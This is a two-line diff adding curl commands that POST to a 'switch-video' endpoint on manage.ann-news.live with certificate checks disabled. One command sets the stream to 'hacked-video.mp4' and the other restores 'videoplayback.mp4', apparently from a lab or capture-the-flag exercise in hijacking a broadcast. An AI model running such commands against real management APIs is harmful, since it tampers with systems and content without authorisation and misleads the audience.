@@ -1,0 +1,2 @@
+curl -k -X POST https://manage.ann-news.live/api/switch-video      -H "Content-Type: application/json"      -d '{"video": "hacked-video.mp4"}'
+curl -k -X POST https://manage.ann-news.live/api/switch-video      -H "Content-Type: application/json"      -d '{"video": "videoplayback.mp4"}'
